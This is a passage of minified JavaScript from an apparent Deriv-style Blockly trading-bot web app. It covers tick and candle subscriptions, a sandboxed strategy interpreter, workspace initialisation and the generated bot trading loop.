                        getTotalProfit: t => e.getTotalProfit(t, e.tradeOptions.currency)
                    }),
                    eJ = e => ({
                        dateTimeStringToTimestamp: e => {
                            let t;
                            let n = (0, y.NC)("Invalid date/time: {{ datetime_string }}", {
                                datetime_string: e
                            });
                            if ("string" != typeof e) return n;
                            let a = e.replace(/[^0-9.:-\s]/g, "").replace(/\s+/g, " ").trim().split(" "),
                                i = /^[12]\d{3}-(0[1-9]|1[0-2])-(0[1-9]|[12]\d|3[01])$/;
                            if (t = a.length >= 2 ? i.test(a[0]) && /^(0[0-9]|1[0-9]|2[0-3]):([0-5][0-9])(:([0-5][0-9])?)?$/.test(a[1]) ? `${a[0]}T${a[1]}` : null : 1 === a.length ? i.test(a[0]) ? a[0] : null : null) {
                                let e = new Date(t);
                                if (e instanceof Date && !isNaN(e)) return e.getTime() / 1e3
                            }
                            return n
                        },
                        getTime: () => parseInt(new Date().getTime() / 1e3),
                        ...eO(),
                        ...eQ(e),
                        ...eq(e),
                        highlightBlock: e => {
                            let t = window.Blockly.derivWorkspace.getBlockById(e);
                            window.Blockly.BlockSvg.prototype.highlightExecutedBlock = function() {
                                let e = "block--execution-highlighted";
                                !window.Blockly.utils.dom.hasClass(this.svgGroup_, e) && (window.Blockly.utils.dom.addClass(this.svgGroup_, e), setTimeout(() => {
                                    this.svgGroup_ && window.Blockly.utils.dom.removeClass(this.svgGroup_, e)
                                }, 1505))
                            }, t && t.highlightExecutedBlock(t)
                        }
                    }),
                    e0 = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1;
                        return new Promise(n => setTimeout(() => {
                            n(), setTimeout(() => e.emit("CONTINUE"), 0)
                        }, 1e3 * t), () => {})
                    },
                    e1 = e => {
                        let t = new ex(e),
                            {
                                observer: n
                            } = e;
                        return {
                            tradeEngine: t,
                            observer: n,
                            getInterface: () => ({ ...eS(t),
                                ...eJ(t),
                                getTicksInterface: eC(t),
                                watch: function() {
                                    for (var e = arguments.length, n = Array(e), a = 0; a < e; a++) n[a] = arguments[a];
                                    return t.watch(...n)
                                },
                                sleep: function() {
                                    for (var e = arguments.length, t = Array(e), a = 0; a < e; a++) t[a] = arguments[a];
                                    return e0(n, ...t)
                                },
                                alert: function() {
                                    for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                                    return alert(...t)
                                },
                                prompt: function() {
                                    for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                                    return prompt(...t)
                                },
                                console: {
                                    log() {
                                        for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                                        console.log(new Date().toLocaleTimeString(), ...t)
                                    }
                                }
                            })
                        }
                    };
                var e2 = n("35369");
                let e9 = e => ({
                        epoch: +e.epoch,
                        quote: +e.quote
                    }),
                    e5 = e => ({
                        open: +e.open,
                        high: +e.high,
                        low: +e.low,
                        close: +e.close,
                        epoch: +(e.open_time || e.epoch)
                    }),
                    e7 = e => e.map(e => e5(e)),
                    e6 = (e, t) => e_(e).epoch >= t.epoch ? e : [...e.slice(1), t],
                    e3 = (e, t) => {
                        let n = e_(e);
                        return n.open === t.open && n.high === t.high && n.low === t.low && n.close === t.close && n.epoch === t.epoch || n.epoch > t.epoch ? e : [...n.epoch === t.epoch ? e.slice(0, -1) : e.slice(1), t]
                    },
                    e4 = e => e ? "candles" : "ticks";
                class e8 {
                    requestPipSizes() {
                        return this.pipSizes ? Promise.resolve(this.pipSizes) : (!this.active_symbols_promise && (this.active_symbols_promise = new Promise(e => {
                            this.pipSizes = d.DO.pip_sizes, e(this.pipSizes)
                        })), this.active_symbols_promise)
                    }
                    async request(e) {
                        return new Promise((t, n) => {
                            let {
                                symbol: a,
                                granularity: i
                            } = e, l = e4(i);
                            "ticks" === l && this.ticks.has(a) && t(this.ticks.get(a)), "candles" === l && this.candles.hasIn([a, Number(i)]) && t(this.candles.getIn([a, Number(i)])), this.requestStream({ ...e,
                                style: l
                            }).then(e => {
                                t(e)
                            }).catch(e => {
                                n(e)
                            })
                        })
                    }
                    monitor(e) {
                        return new Promise((t, n) => {
                            let {
                                symbol: a,
                                granularity: i,
                                callback: l
                            } = e, o = e4(i), s = (0, g.Fs)();
                            this.request(e).then(() => {
                                "ticks" === o ? (this.tickListeners = this.tickListeners.setIn([a, s], l), _.P.emit("bot.bot_ready"), d.DO.toggleRunButton(!1)) : this.ohlcListeners = this.ohlcListeners.setIn([a, Number(i), s], l), t(s)
                            }).catch(e => {
                                _.P.emit("Error", e), this.ticks_history_promise = null, d.DO.toggleRunButton(!1), n(e)
                            })
                        })
                    }
                    async stopMonitor(e) {
                        let {
                            symbol: t,
                            granularity: n,
                            key: a
                        } = e, i = e4(n);
                        "ticks" === i && this.tickListeners.hasIn([t, a]) && (this.tickListeners = this.tickListeners.deleteIn([t, a])), "candles" === i && this.ohlcListeners.hasIn([t, Number(n), a]) && (this.ohlcListeners = this.ohlcListeners.deleteIn([t, Number(n), a])), await this.unsubscribeIfEmptyListeners(e)
                    }
                    async unsubscribeIfEmptyListeners(e) {
                        let {
                            symbol: t,
                            granularity: n
                        } = e, a = !1, i = this.tickListeners.get(t);
                        i && !i.size && (this.tickListeners = this.tickListeners.delete(t), this.ticks = this.ticks.delete(t), a = !0);
                        let l = this.ohlcListeners.getIn([t, Number(n)]);
                        l && !l.size && (this.ohlcListeners = this.ohlcListeners.deleteIn([t, Number(n)]), this.candles = this.candles.deleteIn([t, Number(n)]), a = !0), a && await this.unsubscribeAllAndSubscribeListeners(t)
                    }
                    unsubscribeAllAndSubscribeListeners(e) {
                        let t = this.subscriptions.getIn(["ohlc", e]);
                        Promise.all([...t ? Array.from(t.values()) : []].map(e => (0, g.l6)(() => d.DO.api.forget(e)))), this.subscriptions = new e2.D5
                    }
                    updateTicksAndCallListeners(e, t) {
                        if (this.ticks.get(e) === t) return;
                        this.ticks = this.ticks.set(e, t);
                        let n = this.tickListeners.get(e);
                        n && n.forEach(t => t(this.ticks.get(e)))
                    }
                    updateCandlesAndCallListeners(e, t) {
                        if (this.ticks.getIn(e) === t) return;
                        this.candles = this.candles.setIn(e, t);
                        let n = this.ohlcListeners.getIn(e);
                        n && n.forEach(t => t(this.candles.getIn(e)))
                    }
                    observe() {
                        if (d.DO.api) {
                            let e = d.DO.api.onMessage().subscribe(e => {
                                let {
                                    data: t
                                } = e;
                                if ("tick" === t.msg_type) {
                                    let {
                                        tick: e
                                    } = t, {
                                        symbol: n,
                                        id: a
                                    } = e;
                                    this.ticks.has(n) && (this.subscriptions = this.subscriptions.setIn(["tick", n], a), this.updateTicksAndCallListeners(n, e6(this.ticks.get(n), e9(e))))
                                }
                                if ("ohlc" === t.msg_type) {
                                    let {
                                        ohlc: e
                                    } = t, {
                                        symbol: n,
                                        granularity: a,
                                        id: i
                                    } = e;
                                    if (this.candles.hasIn([n, Number(a)])) {
                                        this.subscriptions = this.subscriptions.setIn(["ohlc", n, Number(a)], i);
                                        let t = [n, Number(a)];
                                        this.updateCandlesAndCallListeners(t, e3(this.candles.getIn(t), e5(e)))
                                    }
                                }
                            });
                            d.DO.pushSubscription(e)
                        }
                    }
                    requestStream(e) {
                        let {
                            style: t
                        } = e, n = JSON.stringify(e);
                        if ("ticks" === t) {
                            var a;
                            return (null === (a = this.ticks_history_promise) || void 0 === a ? void 0 : a.stringified_options) !== n && (this.ticks_history_promise = {
                                promise: this.requestPipSizes().then(() => this.requestTicks(e)),
                                stringified_options: n
                            }), this.ticks_history_promise.promise
                        }
                        return "candles" === t ? ((!this.candles_promise || this.candles_promise.stringified_options !== n) && (this.candles_promise = {
                            promise: this.requestPipSizes().then(() => this.requestTicks(e)),
                            stringified_options: n
                        }), this.candles_promise.promise) : []
                    }
                    requestTicks(e) {
                        let {
                            symbol: t,
                            granularity: n,
                            style: a
                        } = e, i = {
                            ticks_history: t,
                            subscribe: 1,
                            end: "latest",
                            count: 1e3,
                            granularity: n ? Number(n) : void 0,
                            style: a
                        };
                        return new Promise((e, l) => {
                            !d.DO.api && e([]), (0, g.l6)(() => d.DO.api.send(i), [], d.DO).then(i => {
                                if ("ticks" === a) {
                                    let n = eh(i.history);
                                    this.updateTicksAndCallListeners(t, n), e(n)
                                } else {
                                    let a = e7(i.candles);
                                    this.updateCandlesAndCallListeners([t, Number(n)], a), e(a)
                                }
                            }).catch(l)
                        })
                    }
                    unsubscribeFromTicksService() {
                        return new Promise((e, t) => {
                            this.forget().then(() => {
                                this.forgetCandleSubscription().then(() => {
                                    e()
                                }).catch(t)
                            }).catch(t), this.ticks_history_promise = null
                        })
                    }
                    constructor() {
                        (0, o._)(this, "forget", () => new Promise((e, t) => {
                            (null === d.DO || void 0 === d.DO ? void 0 : d.DO.api) ? d.DO.api.forgetAll("ticks").then(() => {
                                e()
                            }).catch(t): e()
                        })), (0, o._)(this, "forgetCandleSubscription", () => new Promise((e, t) => {
                            (null === d.DO || void 0 === d.DO ? void 0 : d.DO.api) ? d.DO.api.forgetAll("candles").then(() => {
                                e()
                            }).catch(t): e()
                        })), this.ticks = new e2.D5, this.candles = new e2.D5, this.tickListeners = new e2.D5, this.ohlcListeners = new e2.D5, this.subscriptions = new e2.D5, this.ticks_history_promise = null, this.active_symbols_promise = null, this.candles_promise = null, this.observe()
                    }
                }
                let te = () => {
                    let e = new _.Z,
                        t = new e8;
                    return {
                        observer: e,
                        ticksService: t,
                        stopped: !1
                    }
                };
                p().prototype.takeStateSnapshot = function() {
                    return m(this.stateStack, void 0, void 0, void 0, !0)
                }, p().prototype.restoreStateSnapshot = function(e) {
                    this.stateStack = m(e, void 0, void 0, void 0, !0), this.global = this.stateStack[0].scope.object || this.stateStack[0].scope, this.initFunc_(this, this.global)
                };
                let tt = e => e && e.tradeEngine.options,
                    tn = e => tt(e) && e.tradeEngine.tradeOptions,
                    ta = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "";
                        return !f.Jr.includes(t) && tt(e) && e.tradeEngine.options.shouldRestartOnError
                    },
                    ti = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "";
                        return !!(["SellNotAvailableCustom", "ContractCreationFailure", "InvalidtoBuy"].includes(t) && tt(e)) || !1
                    },
                    tl = e => tt(e) && e.tradeEngine.options.timeMachineEnabled,
                    to = () => {
                        let e, t = te(),
                            n = e1(t),
                            a = {};
                        t.observer.register("REVERT", e => i("before" === e ? t.beforeState : t.duringState));

                        function i(e) {
                            a.restoreStateSnapshot(e), a.paused_ = !1, l()
                        }

                        function l() {
                            (t.stopped || !a.run()) && e(a.pseudoToNative(a.value))
                        }

                        function o(e, n) {
                            let a = function() {
                                for (var a = arguments.length, i = Array(a), o = 0; o < a; o++) i[o] = arguments[o];
                                let s = i.pop(),
                                    r = i.slice().reverse(),
                                    d = r.findIndex(e => void 0 !== e);
                                n(...(d < 0 ? [] : r.slice(d).reverse()).map(t => e.pseudoToNative(t))).then(t => {
                                    s(e.nativeToPseudo(t)), l()
                                }).catch(e => {
                                    t.observer.emit("Error", e.error || e)
                                })
                            };
                            return Object.defineProperty(a, "length", {
                                value: 101
                            }), e.createAsyncFunction(a)
                        }

                        function s(e, i) {
                            let l = n.getInterface(),
                                {
                                    getTicksInterface: s,
                                    alert: r,
                                    prompt: d,
                                    sleep: c,
                                    console: u
                                } = l;
                            e.setProperty(i, "console", e.nativeToPseudo(u)), e.setProperty(i, "alert", e.nativeToPseudo(r)), e.setProperty(i, "prompt", e.nativeToPseudo(d)), e.setProperty(i, "getPurchaseReference", e.nativeToPseudo(l.getPurchaseReference));
                            let m = e.nativeToPseudo(l);
                            Object.entries(s).forEach(t => {
                                let [n, a] = t;
                                return e.setProperty(m, n, o(e, a))
                            }), e.setProperty(m, "start", e.nativeToPseudo(function() {
                                for (var a = arguments.length, i = Array(a), o = 0; o < a; o++) i[o] = arguments[o];
                                let {
                                    start: s
                                } = l;
                                ta(n) && (t.startState = e.takeStateSnapshot()), s(...i)
                            })), e.setProperty(m, "purchase", o(e, l.purchase)), e.setProperty(m, "sellAtMarket", o(e, l.sellAtMarket)), e.setProperty(i, "Bot", m), e.setProperty(i, "watch", o(e, e => {
                                let {
                                    watch: i
                                } = n.getInterface();
                                if (tl(n)) {
                                    let n = a.takeStateSnapshot();
                                    "before" === e ? t.beforeState = n : t.duringState = n
                                }
                                return i(e)
                            })), e.setProperty(i, "sleep", o(e, c))
                        }
                        async function r() {
                            return new Promise((e, a) => {
                                try {
                                    var i, l, o;
                                    let a = _.P.getState("global_timeouts") ? ? [],
                                        s = Object.keys(a).every(e => a[e].is_cancellable);
                                    !n.tradeEngine.contractId && s ? (d.DO.is_stopping = !0, a.forEach(e => clearTimeout(a[e])), c().then(() => {
                                        d.DO.is_stopping = !1, e()
                                    })) : !1 === n.tradeEngine.isSold && !t.is_error_triggered && (0, u.L8o)((null == n ? void 0 : null === (o = n.tradeEngine) || void 0 === o ? void 0 : null === (l = o.data) || void 0 === l ? void 0 : null === (i = l.contract) || void 0 === i ? void 0 : i.contract_type) ? ? "") ? _.P.register("contract.status", async t => {
                                        "contract.sold" === t.id && c().then(() => e())
                                    }) : (d.DO.is_stopping = !0, c().then(() => {
                                        d.DO.is_stopping = !1, e()
                                    }))
                                } catch (e) {
                                    a(e)
                                }
                            })
                        }
                        async function c() {
                            return new Promise((e, n) => {
                                try {
                                    t.stopped = !0, t.is_error_triggered = !1, _.P.emit("bot.stop");
                                    let {
                                        ticksService: n
                                    } = t;
                                    d.DO.clearSubscriptions(), n.unsubscribeFromTicksService().then(() => {
                                        e()
                                    })
                                } catch (e) {
                                    n(e)
                                }
                            })
                        }
                        async function m() {
                            let {
                                ticksService: e
                            } = t;
                            return new Promise((t, n) => {
                                try {
                                    e.unsubscribeFromTicksService().then(() => {
                                        t()
                                    })
                                } catch (e) {
                                    n(e)
                                }
                            })
                        }
                        return {
                            stop: r,
                            run: function(o) {
                                return new Promise((r, d) => {
                                    let u = l => {
                                        if (t.stopped) return;
                                        if ("InvalidToken" === l.code) {
                                            _.P.emit("client.invalid_token");
                                            return
                                        }
                                        if (ti(n, null == l ? void 0 : l.code)) {
                                            _.P.emit("ui.log.error", l.message), _.P.emit("bot.click_stop");
                                            return
                                        }
                                        if (t.is_error_triggered = !0, !ta(n, l.code) || !tn(n)) {
                                            d(l);
                                            return
                                        }
                                        _.P.emit("Error", l);
                                        let {
                                            initArgs: o,
                                            tradeOptions: s
                                        } = n.tradeEngine;
                                        c(), n = e1(t = te()), a = {}, e = () => {}, t.observer.register("Error", u), n.tradeEngine.init(...o), n.tradeEngine.start(s), t.startState && (null == a ? void 0 : a.restoreStateSnapshot) instanceof Function && i(t.startState)
                                    };
                                    t.observer.register("Error", u), a = new(p())(o, s), e = r, l()
                                })
                            },
                            terminateSession: c,
                            bot: n,
                            unsubscribeFromTicksService: m
                        }
                    };
                var ts = n("94576"),
                    tr = n("66345"),
                    td = n("26855"),
                    tc = n("56505"),
                    tu = n("63999"),
                    tm = n("5466"),
                    tb = n("8813");
                let tp = {};
                tp.inherits = function(e, t) {
                    function n() {}
                    n.prototype = t.prototype, e.superClass_ = t.prototype, e.prototype = new n, e.prototype.constructor = e, e.base = function(e, n) {
                        for (var a = arguments.length, i = Array(a > 2 ? a - 2 : 0), l = 2; l < a; l++) i[l - 2] = arguments[l];
                        return t.prototype[n].apply(e, i)
                    }
                }, tp.math = {}, tp.isDef = function(e) {
                    return void 0 !== e
                }, tp.math.Size = function(e, t) {
                    this.width = e, this.height = t
                }, tp.isNumber = function(e) {
                    return /^\s*-?\d+(\.\d+)?\s*$/.test(e)
                }, tp.dom = {}, tp.dom.removeNode = function(e) {
                    let t = e.parentNode;
                    e && t && (null == t ? void 0 : t.contains(e)) && (null == t || t.removeChild(e))
                }, tp.math.Coordinate = function(e, t) {
                    this.x = tp.isDef(e) ? e : 0, this.y = tp.isDef(t) ? t : 0
                }, tp.math.Coordinate.prototype.scale = function(e, t) {
                    return t = tp.isNumber(t) ? t : e, this.x *= e, this.y *= t, this
                }, tp.math.Coordinate.difference = function(e, t) {
                    return new tp.math.Coordinate(e.x - t.x, e.y - t.y)
                };
                window.goog = tp;
                let tf = () => {
                        ["blockInline"].forEach(e => {
                            window.Blockly.ContextMenuRegistry.registry.getItem(e).preconditionFn = () => "hidden"
                        });
                        let e = {
                            undoWorkspace: (0, y.NC)("Undo"),
                            redoWorkspace: (0, y.NC)("Redo"),
                            cleanWorkspace: (0, y.NC)("Clean up Blocks"),
                            collapseWorkspace: (0, y.NC)("Collapse Blocks"),
                            expandWorkspace: (0, y.NC)("Expand Blocks"),
                            workspaceDelete: (0, y.NC)("Delete All Blocks")
                        };
                        Object.keys(e).forEach(t => {
                            window.Blockly.ContextMenuRegistry.registry.getItem(t).displayText = (0, y.NC)(e[t])
                        })
                    },
                    t_ = async e => {
                        let t = await n.e("551").then(n.t.bind(n, 34948, 23));
                        window.Blockly = t.default, window.Blockly.Colours = {};
                        let a = new window.Blockly.Generator("code"),
                            i = { ...tm,
                                ...a
                            };
                        window.Blockly.JavaScript = i, window.Blockly.Themes.zelos_renderer = window.Blockly.Theme.defineTheme("zelos_renderer", {
                            base: window.Blockly.Themes.Zelos,
                            componentStyles: {}
                        }), tf(), (0, tb.O)(e), await n.e("463").then(n.bind(n, 62471)), await n.e("799").then(n.bind(n, 79781))
                    };
                var th = n("56443");
                let tv = (e, t) => e.keys().map((n, a) => ({
                        id: `${t}-${a}`,
                        name: n.replace("./", "").replace(".xml", "").replace(/\*/g, "").replace(/([A-Z])([A-Z][a-z])/g, "$1 $2").replace(/([a-z])([A-Z])/g, "$1 $2").replace(/[_-]/g, " ").replace(/\s+/g, " ").trim(),
                        description: "Automate your trades with our freebots",
                        xml: e(n).default,
                        folder: t
                    })),
                    ty = tv(n(35119), "popular"),
                    tk = tv(n(59719), "normal"),
                    tg = [...ty, ...tk, ...tv(n(1601), "automated")];
                class tT {
                    async initWorkspace(e, t, a, i, l) {
                        await t_(l);
                        let o = await (0, tr.WN)();
                        this.interpreter = to();
                        var s = this;
                        return window.Blockly.Blocks.trade_definition_tradetype.onchange = function(e) {
                            if (!this.workspace || window.Blockly.derivWorkspace.isFlyoutVisible || this.workspace.isDragging()) return;
                            this.enforceLimitations();
                            let {
                                name: t,
                                type: n
                            } = e;
                            if (n === window.Blockly.Events.BLOCK_CHANGE) {
                                let n = "SYMBOL_LIST" === t,
                                    l = "TRADETYPECAT_LIST" === t;
                                if (n || l) {
                                    var a, i;
                                    let {
                                        contracts_for: t
                                    } = (null === c.Z || void 0 === c.Z ? void 0 : c.Z.instance) ? ? {}, o = this.getTopParent().getChildByType("trade_definition_market"), r = o.getFieldValue("MARKET_LIST"), d = o.getFieldValue("SUBMARKET_LIST"), u = o.getFieldValue("SYMBOL_LIST"), m = this.getFieldValue("TRADETYPECAT_LIST"), b = this.getFieldValue("TRADETYPE_LIST");
                                    if ("accumulator" !== b && (0, tu.wd)(s), n) {
                                        if (null == t || null === (a = t.getTradeTypeCategories) || void 0 === a || a.call(t, r, d, u).then(t => {
                                                let n = this.getField("TRADETYPECAT_LIST");
                                                n && n.updateOptions(t, {
                                                    default_value: m,
                                                    should_pretend_empty: !0,
                                                    event_group: e.group
                                                })
                                            }), s.symbol = u, !s.is_bot_running && s.interpreter && !this.workspace.options.readOnly && u !== s.interpreter.bot.tradeEngine.symbol) {
                                            let e = document.querySelector("#db-animation__run-button");
                                            e && (e.disabled = !0), s.interpreter.unsubscribeFromTicksService().then(async () => {
                                                var e;
                                                await (null === (e = s.interpreter) || void 0 === e ? void 0 : e.bot.tradeEngine.watchTicks(u))
                                            })
                                        }
                                    } else l && e.blockId === this.id && (null == t || null === (i = t.getTradeTypes) || void 0 === i || i.call(t, r, d, u, m).then(t => {
                                        this.getField("TRADETYPE_LIST").updateOptions(t, {
                                            default_value: b,
                                            should_pretend_empty: !0,
                                            event_group: e.group
                                        })
                                    }))
                                }
                            }
                        }, new Promise((l, s) => {
                            n.p = e, c.Z.setInstance(a), q.Z.setInstance(t);
                            let d = window.innerWidth;
                            try {
                                let e = .7,
                                    {
                                        handleFileChange: t
                                    } = q.Z.instance;
                                if (d < 1640) {
                                    if (i) e = .6;
                                    else {
                                        var u;
                                        let t = null === (u = document.getElementById("scratch_div")) || void 0 === u ? void 0 : u.offsetWidth;
                                        e = t / d / 1.5
                                    }
                                }
                                let n = document.getElementById("scratch_div");
                                if (!n) return;
                                this.workspace = window.Blockly.inject(n, {
                                    media: "assets/media/",
                                    renderer: "zelos",
                                    trashcan: !i,
                                    zoom: {
                                        wheel: !0,
                                        startScale: e
                                    },
                                    scrollbars: !0,
                                    theme: window.Blockly.Themes.zelos_renderer
                                }), this.workspace.RTL = (0, td.rK)(), this.workspace.cached_xml = {
                                    main: tc.default
                                }, this.workspace.dollar_cached_xml = tg, this.workspace.addChangeListener(this.valueInputLimitationsListener.bind(this)), this.workspace.addChangeListener(e => (0, th.P_)(this.workspace, e)), this.workspace.addChangeListener(e => this.workspace.dispatchBlockEventEffects(e)), this.workspace.addChangeListener(e => {
                                    if ("drag" === e.type && !e.isStart && !i && (0, th.Y2)(), e.type == window.Blockly.Events.BLOCK_CHANGE) {
                                        let t = this.workspace.getBlockById(e.blockId);
                                        i && t && "collapsed" == e.element && (t.contextMenu = !1)
                                    }
                                }), window.Blockly.derivWorkspace = this.workspace;
                                let a = new window.Blockly.Names("window");
                                a.variableMap = window.Blockly.derivWorkspace.getVariableMap(), window.Blockly.JavaScript.variableDB_ = a, this.addBeforeRunFunction(this.unselectBlocks.bind(this)), this.addBeforeRunFunction(this.disableStrayBlocks.bind(this)), this.addBeforeRunFunction(this.checkForErroredBlocks.bind(this)), this.addBeforeRunFunction(this.checkForRequiredBlocks.bind(this)), this.workspace.current_strategy_id = window.Blockly.utils.idGenerator.genUid(), window.Blockly.derivWorkspace.strategy_to_load = tc.default, window.Blockly.getMainWorkspace().strategy_to_load = tc.default, window.Blockly.getMainWorkspace().RTL = (0, td.rK)();
                                let s = (0, r.vc)().default_file_name;
                                if (o && o.length) {
                                    let e = o[0];
                                    window.Blockly.derivWorkspace.strategy_to_load = e.xml, window.Blockly.getMainWorkspace().strategy_to_load = e.xml, s = e.name, window.Blockly.derivWorkspace.current_strategy_id = e.id, window.Blockly.getMainWorkspace().current_strategy_id = e.id
                                }
                                let c = `dbot-load${Date.now()}`;
                                window.Blockly.Events.setGroup(c), window.Blockly.Xml.domToWorkspace(window.Blockly.utils.xml.textToDom(window.Blockly.derivWorkspace.strategy_to_load), this.workspace);
                                let {
                                    save_modal: m
                                } = q.Z.instance;
                                m.updateBotName(s), this.workspace.cleanUp(0, i ? 60 : 56), this.workspace.clearUndo(), window.dispatchEvent(new Event("resize")), window.addEventListener("dragover", tT.handleDragOver), window.addEventListener("drop", e => tT.handleDropOver(e, t)), n.parentNode.style.overflow = "hidden", l()
                            } catch (e) {
                                throw s(e), e
                            }
                        })
                    }
                    isStrategyUpdated(e, t) {
                        if (t && t.length) {
                            var n;
                            let a = null === (n = t.filter(e => {
                                var t;
                                return (null == e ? void 0 : e.id) === (null === (t = this.workspace) || void 0 === t ? void 0 : t.current_strategy_id)
                            })) || void 0 === n ? void 0 : n[0];
                            if (null == a ? void 0 : a.xml) {
                                let t = null == a ? void 0 : a.xml,
                                    n = window.Blockly.Xml.domToText(e);
                                if ((0, ts.dY)(t, n)) return !1
                            }
                        }
                        return !0
                    }
                    async saveRecentWorkspace() {
                        var e, t;
                        let n = (null === this || void 0 === this ? void 0 : this.workspace) ? null === (t = Blockly) || void 0 === t ? void 0 : null === (e = t.Xml) || void 0 === e ? void 0 : e.workspaceToDom(this.workspace) : null;
                        try {
                            let e = await (0, tr.WN)();
                            n && this.isStrategyUpdated(n, e) && await (0, tr.l5)(n, s.Rg.UNSAVED)
                        } catch (e) {
                            ts.Pi.emit("Error", e), await (0, tr.l5)(n, s.Rg.UNSAVED)
                        }
                    }
                    addBeforeRunFunction(e) {
                        this.before_run_funcs.push(e)
                    }
                    shouldRunBot() {
                        return this.before_run_funcs.every(e => !!e())
                    }
                    async initializeInterpreter() {
                        this.interpreter && await this.interpreter.terminateSession(), this.interpreter = to()
                    }
                    runBot() {
                        if (!d.DO.is_stopping) try {
                            d.DO.is_stopping = !1;
                            let e = this.generateCode();
                            !this.interpreter.bot.tradeEngine.checkTicksPromiseExists() && (this.interpreter = to()), this.is_bot_running = !0, d.DO.setIsRunning(!0), this.interpreter.run(e).catch(e => {
                                ts.Pi.emit("Error", e), this.stopBot()
                            })
                        } catch (e) {
                            ts.Pi.emit("Error", e), this.interpreter && this.stopBot()
                        }
                    }
                    generateCode() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                        return `
            var BinaryBotPrivateInit;
            var BinaryBotPrivateStart;
            var BinaryBotPrivateBeforePurchase; 
            var BinaryBotPrivateDuringPurchase;
            var BinaryBotPrivateAfterPurchase;
            var BinaryBotPrivateLastTickTime;
            var BinaryBotPrivateTickAnalysisList = [];
            var BinaryBotPrivateHasCalledTradeOptions = false;

           
            function recursiveList(list, final_list){
                for(var i=0; i < list.length; i++){
                    if(typeof(list[i]) === 'object'){
                        recursiveList(list[i], final_list);
                    }
                    if(typeof(list[i]) == 'number'){
                        final_list.push(list[i]);   
                                  
                    }
                }
                return final_list;
            }

            function BinaryBotPrivateRun(f, arg) {
                if (f) return f(arg);
                return false;
            }
            function BinaryBotPrivateTickAnalysis() {
                var currentTickTime = Bot.getLastTick(true);
                while (currentTickTime === 'MarketIsClosed') {
                    sleep(5);
                    currentTickTime = Bot.getLastTick(true);
                }
                currentTickTime = currentTickTime.epoch;
                if (currentTickTime === BinaryBotPrivateLastTickTime) {
                    return;
                }
                BinaryBotPrivateLastTickTime = currentTickTime;
                for (var BinaryBotPrivateI = 0; BinaryBotPrivateI < BinaryBotPrivateTickAnalysisList.length; BinaryBotPrivateI++) {
                    BinaryBotPrivateRun(BinaryBotPrivateTickAnalysisList[BinaryBotPrivateI]);
                }
            }
            var BinaryBotPrivateLimitations = ${JSON.stringify(e)};
            ${window.Blockly.JavaScript.javascriptGenerator.workspaceToCode(this.workspace)}
            BinaryBotPrivateRun(BinaryBotPrivateInit);
            while (true) {
                BinaryBotPrivateTickAnalysis();
                BinaryBotPrivateRun(BinaryBotPrivateStart);
                if (!BinaryBotPrivateHasCalledTradeOptions) {
                    sleep(1);
                    continue;
                }
                while (watch('before')) {
                    BinaryBotPrivateTickAnalysis();
                    BinaryBotPrivateRun(BinaryBotPrivateBeforePurchase);
                }
                while (watch('during')) {
                    BinaryBotPrivateTickAnalysis();
                    BinaryBotPrivateRun(BinaryBotPrivateDuringPurchase);
                }
                BinaryBotPrivateTickAnalysis();
                if (!BinaryBotPrivateRun(BinaryBotPrivateAfterPurchase)) {
                    break;
                }
            }
            
            `
                    }
                    async stopBot() {
                        !d.DO.is_stopping && (d.DO.setIsRunning(!1), await this.interpreter.stop(), this.is_bot_running = !1, this.interpreter = null, this.interpreter = to(), await this.interpreter.bot.tradeEngine.watchTicks(this.symbol), (0, tu.wd)(this))
                    }
                    async terminateBot() {
                        this.interpreter && (await this.interpreter.terminateSession(), this.interpreter = null, this.interpreter = to(), await this.interpreter.bot.tradeEngine.watchTicks(this.symbol))
                    }
                    unselectBlocks() {
                        return window.Blockly.getSelected() && window.Blockly.getSelected().unselect(), !0
                    }
                    disableStrayBlocks() {
                        return this.workspace.getTopBlocks().forEach(e => {
                            !e.isMainBlock() && !e.isIndependentBlock() && this.disableBlocksRecursively(e)
                        }), !0
                    }
                    disableBlocksRecursively(e) {
                        var t;
                        e.setDisabled(!0), (null === (t = e.nextConnection) || void 0 === t ? void 0 : t.targetConnection) && this.disableBlocksRecursively(e.nextConnection.targetConnection.sourceBlock_)
                    }
                    checkForErroredBlocks() {
                        this.valueInputLimitationsListener({}, !0);
                        let e = this.workspace.getAllBlocks(!0).filter(e => e.is_error_highlighted && !e.disabled).filter((e, t, n) => t === n.findIndex(t => t.error_message === e.error_message));
                        return !e.length || (this.workspace.centerOnBlock(e[0].id), e.forEach(e => {
                            ts.Pi.emit("ui.log.error", e.error_message)
                        }), !1)
                    }
                    centerAndHighlightBlock(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                            n = this.workspace.getBlockById(e);
                        if (!!n) this.workspace.getAllBlocks().forEach(e => e.setErrorHighlighted(!1)), t && n.blink(), n.setErrorHighlighted(!0), this.workspace.centerOnBlock(n.id)
                    }
                    unHighlightAllBlocks() {
                        var e;
                        null === (e = this.workspace) || void 0 === e || e.getAllBlocks().forEach(e => e.setErrorHighlighted(!1))
                    }
                    checkForRequiredBlocks() {
                        return (0, th.nf)(this.workspace)
                    }
                    valueInputLimitationsListener(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                        if (!t && (!this.workspace || this.workspace.isDragging())) return;
                        window.Blockly.JavaScript.javascriptGenerator.init(this.workspace), t && window.Blockly.hideChaff(!1);
                        let n = () => e.type === window.Blockly.Events.BLOCK_DRAG && !e.isStart,
                            a = () => e.type === window.Blockly.Events.BLOCK_DELETE,
                            i = () => e.type === window.Blockly.Events.BLOCK_CREATE,
                            l = () => e.type === window.Blockly.Events.UI && ("click" === e.element || "selected" === e.element),
                            o = t => e.type === window.Blockly.Events.BLOCK_CHANGE && e.blockId === t.id,
                            s = t => e.type === window.Blockly.Events.BLOCK_CHANGE && t.inputList.some(t => {
                                if (t.connection) {
                                    let n = t.connection.targetBlock();
                                    return n && e.blockId === n.id
                                }
                                return !1
                            }),
                            r = t => {
                                if (e.type === window.Blockly.Events.BLOCK_CHANGE && "disabled" === e.element) {
                                    let n = t.getParent();
